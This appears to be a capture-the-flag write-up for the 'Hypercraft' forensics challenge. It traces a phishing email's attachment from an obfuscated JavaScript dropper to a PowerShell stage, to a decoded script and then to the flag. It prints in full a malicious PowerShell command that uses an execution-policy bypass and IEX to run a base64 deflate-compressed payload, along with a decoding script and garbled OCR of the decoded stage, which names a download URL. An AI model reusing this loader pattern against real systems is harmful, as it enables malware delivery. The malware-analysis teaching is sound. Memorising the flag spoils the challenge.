# Hypercraft
> This email seems to have come from one of our agents, Axel Knight, but Axel has been missing for weeks, and we believe him to be compromised. The email claims to have information that could be vital to our winning this war, but before we use it, we want to make sure it is safe to open. Analyze the given email and see if it's real, or if it's just the Arodorians trying to phish us, and find the flag.

## About the Challenge
We were given a `zip` file that contains a file with `eml` extension. If we open the `eml` file:


[Image extracted text: Urgent
Plans for Arodorian Hypercraft
axel knight@mod.zeniumhtb <axel knight@mod.zeniumhtb>
To;
gabrielwolfe@mod.zeniumhtb
[TOP SECRET] Arodorian_.
532.13 KB
Many Zeniumites died to recover the information provided here. Attached you'Il find the schematics for the latest hypercraft spaceship under development by
the Commonwealth of Arodor Maximus. These plans are more sophisticated than we expected,
and show that we are at extreme risk of
losing the race, and
ultimately, our freedom_
Please get these to our top engineers immediately, of all hope for the Zenium is lost.
Im uploading this over
low-quality long-distance link. If the cloud copy is corrupted, try the download:
You must get these plans to leadership.
You're our
only hope-
Axel]


## How to Solve?
First, i downloaded the attachment file. And then if we opened the attachment file, we got another file called `[TOP SECRET]Hypercraft Plans.zip`


[Image extracted text: PDF
A_
Adobe
The file is not displayed correctly: Use local downloaded file.
Acrobat DC. It'$ how
the world gets work
done:
View; sign, comment on, and share
PDFs for free:
Are youan IT manager or OEM?
Adobe; Adobe logo, the Adobe PDF logo,
Acrobat are either registered trademarks or trademarks of Adobe in the United States and/or other countries. All other
your softwareupto date
trademarks are the property of their respective owners:
Copyrght @ 2022 Adobe Allrights reserved
Chooseyour region (Change)
Termns of use
Privacy
Report abuse
and
Keep]


Extract the zip file, you will get a JavaScript file. Here is the preview of the js


[Image extracted text: var yqybdscl
"VsZV8WVV6856857WWVZ74ss6VIWTs2s6WWV3WVsVs61sssssWssV6sssVsV46VS7sOsVZVa2
sVsOsssVVss3WVdssssVs2Os667VSssVsssVsVsV6WVeV6sV3VsssWVs74Vsss659WVssVbVsfs
Vsbe2s8sWsssVTVs3VZVSVsWV61sWVsWVsV6ss46ssVsbs6csVssWW737s7VsWVZWVIVs2Ws
sOs7bVsWVssOaTVWWWV6Vsss6ssV1ZWWVs22s074WsTsV/ss6ssWZs6fV63VsZV4V66sWZs6
sss3d7VsVssWssbsss sVdWVBsssbVOa7s6Vss615722VOVs75516857WVIVZsO6Vsf64WVsV6
55572Vs6sWWVd6V96WBsWWVs68s66s6WVss6VV2OWWWVsVBsd2WWVOss3Ws73VsssVsVAs3V
sls34ssVWWWB2Vs3sWWVsbea766V7Vs2VsV2ss07s67sV961s6VsV66WVIVTVBss6WVsssVsf
SS6VsWV6ZsV4WVs636sf7sss6sssWWVs6572Vs7ss156152Vss03ds52VOssVsVs6V6VsV61WVs
V6sssc7VV36WVsWssSsVs3bVsVOaVssVsssss766172VsWsWWsVssWZssssVsWVsVOs6WV1
7sl4dsVbsVsssfssWsVsssssVsssbelsVss3s61WsVsbesWWIs4sVs6ssVfsVsV6f2OsVBsV
SsWssdV2OV22sss75s6VebsWWWWVsVs46VsSWVss66sV6VsVs965WWWVsWWWVsWsVess65VsV
Vss64V2V23bsOVa7ssssss6sVs6VsVssV17sVZWVsssV2Os ZWVsssVsl6sVcVsWZSsVTs97ssV
OVssssWVs6sVssIVIss2VZs4Ws69sWWWVsZVs4sV6ssV9s6fWV6ssVseV/s3VZWsTssbcVs2
ssOVsVs3WssVdss2sWWVsVsVO6s6sWV6sVslsVV6c73565553WVssbVOWVsVssa WssVssVsV
sV6s6WVIsVss7220V7sssa77V6ssssss2ssssWsVssssWWVZZs6WWVfs/ssVs0651V6s5d7056
586VsWVssWscsV6VsVSZVssWWsssssWVWWWV4WV6bsZWVassV6WBsWVs6Vs12VOs3dV2OVs6
66WWWVIVWWWWVsbssVsVclsssVssV3sVbsssVSVsVBssVbVsOa7WWWV6s615VZV2s2sWV069659
CCWnOMceCAWEWedein
An
Wce
An ece
Tn al]



[Image extracted text: case
532:
drake
carcinoma
ceil
Lenore Solomon
Lenten Parsi
frankfurter
1
globular
gripe
tussle equilibrium
crane Celtic moneywort cowhide
hfhwsgmb
uwetjyhi
replace( / [sV]/g,
kindergarten
quaver penis
pawpaw
crew intellect
arent hydro interferon horsehair
observe polygon
var
ooqajrjz
bureau
picofarad
Rosenzweig striate
bush motorcar
ennox dilettante
demography
hole
valeur ninefold lambda
hygrometer]


As you can see, there is a very longggg text, and also there is some js code below the variable. Take the variable and then remove `/[sV]/g` and we got another js file


[Image extracted text: Recipe
Input
D2
sbivsocsssbvsvsovvstsovsovvvvisovsovszovssvavsvsvszvuvsvsvzvsvvvzsviv)sosesosv4vvvsssvsvvosvsvvs)vvosvsssos
Find
Replace
69sssVsVbeV6sVsWSs6WssV4sV2sss23WVsVVbOa76sV6sls7sVZVVZVsOs6V87VO6eVWVs6VWVIVVVGeWVsV6sVsV4Vs6sSVVsVsWZsv
sWVs36ssVsV9VssW6VsWsVsVes656VssssssscWss6sslWVssVssVVZVsvo3ssVsVdVVZVWWVso66s6WVssWWVslssWVsVossVcWVssVs
Find
VsZVs3sss6Vsss53sbVsOa766VVIVssZWssZVsZVsOsZVVAssVZVs3sWesVsbsWV73s63sV6sVfsVssSzssVssVWVWWWVsO6ssVc65V
REGEX
Replace
[sv]
WWVs ZVWZVss6sssssVVsVVf2Ov3VsssWVWVsWdsV2so66s6sWslVSVssVclsVsV3VGVsSVsVs3bsWssVVWVOWVssasV7s661WsVsVWV
s72ssV2OsVsW6cWWVZZV6s9sWVsWV6WVsVs4sVs6Vs4sVsVssVsbcsssW6SssTsVs?VsVW6sVeVsVs6Vc78ssWsls8v2VssvOs3sw
Wdv2o6sVessVsTsVVSs6ssVc6WcssssV3VsVssbOvaZVdOaVZdWssVOaVs3ssbOsaVlsVs6s6VIVsslsWssss2WWZsssOssWsWs6v
Global match
Case insensitive
Multiline matching
ssaV6VAsWVZs26d6f6V3WVVGVf6eVZs4s61V1637VssssssVs4WVWVVZsTs2VOV3d2ssVOV3VsV8VV3sVsVV836sVVV3VZV3sV8s3sVssw
bVssOas7s6V6WVIZVVZVZOV74s66s6Vas6s2s6fss6Vsssss36c7VsVVVsSsZVs4sVs63VsVV6s8WVsZVZsV6ZssVV6Vss4sss7V3JsVsssV
OVssss2VsssVssssssVssVOss3ds2sVsOVZVsss47WVZsVsWVsWVZVssVsWVsVSss6sssVS3bOsaWsssVsTs6s6VslssVWVZWVs22WVs?
Dot matches all
6VbVVVVZVSVs6Vsss369sWVssbesV6VGV65ssZVZsVVZVss2v69sbesVVGVZVsVsssssVZWsezsVaZVsWWVssWVsss03sd2vosVVsVVs6sv
661VsVss6ssWVscTsVsVW36VSssVsWVss3VVbVsOWVssVssa7s6s617s52s5s52065s56cV75V7s6655573sVssVss
06sVSWZssVsVsWV
26sVsVWSssVs6fss2OVWssV3Vssd2OssVssGWVsVsWVsbsWWVsssss6sss1VsVs6VcVVV73s6V53sVbsOssVsasVVZVGVs61VVVZVZVZVO
From Hex
ZVa6csWs7Oss7VZ6VssVsVWSVsVossVdV6sVssVsfWssVssZVZWZss3VGsv6sss6s7VSssVssVV6VcVZV6sVsssVszvOWVs3VssVd2os
ZsV2TsWVsSsWbe6sV46VSsGVss6v69Vss6WVebsssVsVssSs6Vs42VsssVsVs2s3sVbevVsVaVsZWVs6617ss2Vs2VssVssOsVZVsVV96
Delimiter
VVVVV86VssVVs9VsVssVss6sbZVZsss4d6ss167V6WVs7691657s9VsVsVsZVssVWVVsWVsVOW3VdVss203WVV33VZVBVAVsVs3WV9V3VV3
None
ss3WsVssssVbVWVsWOsVVVssVal
70120
Raw
Bytes
Output
0
0
Ixhhwtarcadepz
function(suadklsw)
var
twgoctfv-{};
var
qhypodermichff
74142;
var
vyafisoftcoverqa
false;
var
aqMonsantoo
undefined"
var
qluypartitionswl
false;
var
zwbwopamphletkzca
false;
var
iibigrqb;
var
kyieithero
null;
var
xglistenicl
null;
var
tsrjtemplelrhz
undefined"
var mdijwdetachw
null;
var
yghnplatypuszfwv
60163;
var
gqpsaltyoem
null;
Yan
nicomanosncu
30j06 .]


For this javascript code that we got earlier, i tried to run it using browser console (But i just run the code until variable called `ynvjonvw`). And then run `console.log(ynvjonvw)` to see the value of the variable


[Image extracted text: var
bxmanhtn
vftbkkmu
"hzUHJPbjJneUxmbzRMNXYIT3lxZIBsUZtVNUgYZEnxbGRtR3VUQ3cSdmRLUkMZKzIvWNdIYjhwTDBpZnRDUBNEKzl4eEYveUNCVZSBRUQSalhLMERAUz
hOSDBZcOxsk: DRL
clhBcktEaHNwvetnNExlUnAiTGRpbzNrVOlQDcleFY4ZZYICmdSaHZ4dXitUThKTEhaQUlyNkFxZ29jdjE MkSkbeFhbS9PQUxzslp
aMDdVNmAyclWYajdVLHVTdFBOLZB3VXVTMGtGMINmbNIvMXIyQ2Z6VUNSeTBRdkxibkxUZjITQVZSZTNiblg2aUkzTIhxOEZNNmFaRnFKajBJalRPRDVG
aUFSRjEwVklSMHhJSVgxVFNTYZZnZeFKblRIUXROSIRrYORAZVkLYZIwZMlseUhlKIRnNHhGbVJTYOFEbUJGMEC3TFFlWVJrODBaZlVwalfwalBydUJqc
VpENIJnLygnazenJyksNINSUBRFTSSJTySDTO QcmVTUBIPTisjTO QUMVzcelPTmlvZEVdOjpERUNPTVBSZVNTKXwgRk9yRWFjaHtORVctbaJKZUNUIC
BpTySzVFJIQULSRWFERXIOICRfLFtTNXNUZUBUVEVAdCSLTMNvZGlOZ1ebOkFzo2lpICkgfSApLnJlYURUTOVuZCggkScKIXJ biFBYBRpdmVYT2JGZWN
@INtkcWJZemZwbXNjZWpzdGlwbl/g6amNqd2xlcnVoYxVmzzhldHJvYXlieHhtbWFwZXFOY3Z4bmg1bmtwclxpemRla2z4alZreXFnelllvb3BkcGhrZwhy
ZGxmal96dm94ak16z3phZztpeGSwZhSub3ZuYWNwbGRsendba2lpcmVv
var
oxTransitee
false;
var knueresponsibleeq
89436;
var
sYorktoinlbye
true;
var
rsassafrask
null;
var izuxcBajawa
33909;
var psyRufusi
24485;
var
ynvjonvw
xhhwtarcadepz(bxmanntn).split("!");
var
nhdisciplinebok
undefined
var hslothfulnvd
true;
var msstolenv
false;
var ocsupplementaryidn
false;
var
Iknimbusa
null
suadklsw)
var
tivgoctfv-{};
var
ghypodermichff
74142;
var vyafisoftcoverqa
false;
var aGMonsantoo
undefined
var gluypartitionswl
false_
var Zlblvopamphletkzca
false;
var iibigrqb;
Var
console
(ynvjonvw)
V11O:l
(6)
['akiisqbcqzbegutinthalocycpyvjexcdqaouloezjybswheka_sojoovqlipkbtoqjjkerldknkffjsnecwvbuzysgnwkoidbkr
Wscri
pt. Shell
PolveRShELL
EXEcU
byPAss
IEx(NEW-oBJect
SYsT_SYsTeM. TExt . eNcodiNg]
:AsCii
reaDTOEnd( ) 'In
run
ActiveXObject
kdqbvzfpmscejstipmozjcjwluruhaufghutroaypxxmmapeqt_dphkehrdlfiozvoximzgzagkixopenpovnacpld
Lzwzkiiveo
akiisqbcqzbegutinthalocycpyvjexcdqaouloezjybswhekavemrehcdsbxrloedzmynhszgggpumsojoovqlipkbtoqjjkerldknkffjsn
"Nscript.Shell
PoweRShEIL
EXEcU
byPAss
IEx ( NEW-oBJeCt
SYsTeM.i0.COmpResSion.dEfLaTestReAm( [SySTem. IO.meMOrYStReAm]
run
ActiveXobject"
kdqbvzfpmscejstipmozjcjwluruhaufghutroaypxxmmapeqtcvxnounkpqlizdukfxifkyggyioopdphkehrdlfiozvoximzgzagkixopeni
length:
[[Prototype]]:
Array(0)
undefined
10g"]


As you can see in the second element there is a powershell command like this

```powershell
"PoweRShElL -EXEcU  byPAss    'IEx(NEW-oBJeCT  SYsTeM.iO.COmpResSion.dEfLaTestReAm( [SySTem.IO.meMOrYStReAm] [convert]::FromBase64String(''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''),[SyStEM.IO.COMPreSSION.cOMPRessIONmodE]::DECOMPReSS)| FOrEach{NEW-oBJeCT  iO.sTReAMREaDEr( $_,[SYsTeM.TExt.eNcodiNg]::AsCii ) } ).reaDTOEnd( )'
"
```

For this part, i created another powershell code to decode the encoded string

```powershell
$base64data = "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"
$data = [System.Convert]::FromBase64String($base64data)
$ms = New-Object System.IO.MemoryStream
$ms.Write($data, 0, $data.Length)
$ms.Seek(0,0) | Out-Null

$sr = New-Object System.IO.StreamReader(New-Object System.IO.Compression.DeflateStream($ms, [System.IO.Compression.CompressionMode]::Decompress))

while ($line = $sr.ReadLine()) {  
    $line
}
```

This PowerShell code takes a base64-encoded data, decodes it, decompresses it using the Deflate algorithm, and then reads and outputs each line of the decompressed data. And here is the output of the program


[Image extracted text: PS D: |_[TOP SECRET]
Arodorian Hypercraft.pdf.js>
Itest
psl
SET-ItEM ( "VAr"+"Ia
+"B"+"le
4z0" )
([TypE]("{2}{3}{1} {0}"
~f'odinG
enC'
SYSTEm. T'
ext' )
SV
IgF
[TypE
J("{1}{0} {2}{3}
~f
OnVe
SYsTEM.€
'T')
('SEV
1s' )
([type]("{1}{2}{0}
~F
'E'
Io
fIL'))
S("{4}{1
}{3}{0} {2}"_f
ri
et-
ctMode
St
5' )
~Version
function
UYc 'xq (${TN 'me}
S{Chk
go ' Iul})
{
for (${eum
LMx 'NyUg}
0; ${eu
mL 'MxNYug}
~lt ${T'NME} . "c 'OUnt"
S{Eu 'MLMx 'NyUG}++)
S{t
NME} [${eUM' LM 'XnyuG} ]
(f{t'NmE} [${eUm 'Lmx
N 'yuG} ]
~bxor ${c HKGo
iUl})
return
gEt-vaRIAble ("4"+"20")
~VaL): :"As 'Cii"
'gETs 'T RIng" ( ${tN 'Me})
function
Rc
DAt
CaJT {return (1..16 | .( '%' ) {
{0:X} '
~f (S("{0} {2}{1}"
~f
Ge '
andom
t-R')
~Max
16)
}) -join
S{E 'UM' Lm 'XNy
UGzzOo}
CS("{0} {1}"
~f
Uyc '
xq' )
([System. Byte[]]
@(OxOa, 0xl6, 0xl6, 0x12,0x58, Oxud , Oxud , Oxl1, 0xl6, OxOd
OxOe
0x07, OxOc , 0xl2, OxOe
0x03 , OxOc, OxllOxlc
OxOa, Oxl6, OxO0 , Oxud , Oxl0 , Oxud))
98)
f{suo ' OsTal}
( ("{17{07
~f
Cxa
Uv
(ISvstemBvtef1l
@( 0x31
Ox3c 0x36))
80)
;SV]


Now, as you can see there are a lot of obfuscated variable, now tried to decode all the variables by running several sections of code one at a time and the flag was located in `$aetRsdf` variable


[Image extracted text: Uc
OXIZ uxue
OXus
OXUC
OX1I
OX4C
oxua
OXI0
OXUU UX44
PS
C: |Users| Muhammad Daffa> $EUMLmXNyUGZzOO
http://stolenplans.htblr/
PS C: |Users| Muhammad
Daffa> ${aetRsdf}
(G("{2} {1} {
xb3 Oxeb 0x86 Oxec Oxad Oxac
Ox80  Oxb6 0x91 Ox80  Oxa
PS C: |Users | Muhammad Daffa> $aetRsdf
HTB{LOts_of_Luy3rs_iN_thut_1
PS C: |Users| Muhammad
Daffa>]


```
HTB{l0ts_of_l4y3rs_iN_th4t_1}
```